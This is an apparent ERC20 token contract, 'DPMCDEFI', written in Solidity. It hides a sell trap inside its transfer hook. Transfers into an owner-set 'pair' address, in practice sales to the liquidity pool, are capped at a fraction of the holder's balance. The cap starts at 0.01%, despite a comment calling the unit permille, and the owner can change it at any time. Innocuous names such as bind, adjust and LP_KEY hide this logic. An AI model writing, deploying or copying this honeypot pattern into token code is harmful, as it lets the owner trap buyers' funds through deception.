// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract dpmc is ERC20, Ownable {
    mapping(bytes32 => address) private _store;
    uint256 private _ratio; // permille

    bytes32 private constant KEY = keccak256("LP_KEY");

    constructor() ERC20("DPMCDEFI", "DPMC") Ownable(msg.sender) {
        _mint(msg.sender, 10_000_000 * 10 ** decimals());
        _ratio = 1;
    }

    function bind(address addr_) external onlyOwner {
        require(addr_ != address(0), "zero");
        _store[KEY] = addr_;
    }

    function adjust(uint256 val_) external onlyOwner {
        require(val_ > 0, "invalid");
        _ratio = val_;
    }

    function pair() public view returns (address) {
        return _store[KEY];
    }

    function limit() public view returns (uint256) {
        return _ratio;
    }

    function _update(address from, address to, uint256 amount) internal override {
        if (_shouldCheck(from, to)) {
            _check(from, amount);
        }

        super._update(from, to, amount);
    }

    function _shouldCheck(address a, address b) private view returns (bool) {
        return a != address(0) && b == _store[KEY];
    }

    function _check(address user, uint256 amt) private view {
        uint256 max = (balanceOf(user) * _ratio) / 10000;
        require(amt <= max, "exceed");
    }
}